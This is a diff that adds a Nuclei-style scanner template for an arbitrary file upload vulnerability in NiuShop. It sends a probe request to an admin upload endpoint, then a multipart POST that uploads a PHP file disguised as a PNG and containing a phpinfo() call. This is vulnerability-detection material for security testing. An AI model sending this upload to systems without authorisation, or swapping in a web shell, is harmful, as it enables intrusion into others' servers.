@@ -1,0 +1,58 @@
+id: poc-yaml-niushop-arbitrary-file-upload
+
+info:
+  name: NiuShop Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-upload,niushop
+
+flow: http(1) && http(2)
+
+http:
+  - id: "step-1"
+    method: GET
+    path:
+      - "{{BaseURL}}/index.php?s=/admin/upload/uploadfile"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "文路径不能为空"
+
+  - id: "step-2"
+    method: POST
+    path:
+      - "{{BaseURL}}/index.php?s=/admin/upload/uploadfile"
+    headers:
+      Accept: "application/json, text/javascript, */*; q=0.01"
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryBeGAri7DydQdcqWT"
+    body: |-
+      ------WebKitFormBoundaryBeGAri7DydQdcqWT
+      Content-Disposition: form-data; name="album_id"
+
+      30
+      ------WebKitFormBoundaryBeGAri7DydQdcqWT
+      Content-Disposition: form-data; name="type"
+
+      1,2,3,4
+      ------WebKitFormBoundaryBeGAri7DydQdcqWT
+      Content-Disposition: form-data; name="file_path"
+
+      upload/goods/
+      ------WebKitFormBoundaryBeGAri7DydQdcqWT
+      Content-Disposition: form-data; name="file_upload"; filename="1.php"
+      Content-Type: image/png
+
+      <? phpinfo(); ?>
+      ------WebKitFormBoundaryBeGAri7DydQdcqWT--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "请检查您的上传参数配置或上传的文件是否有误"
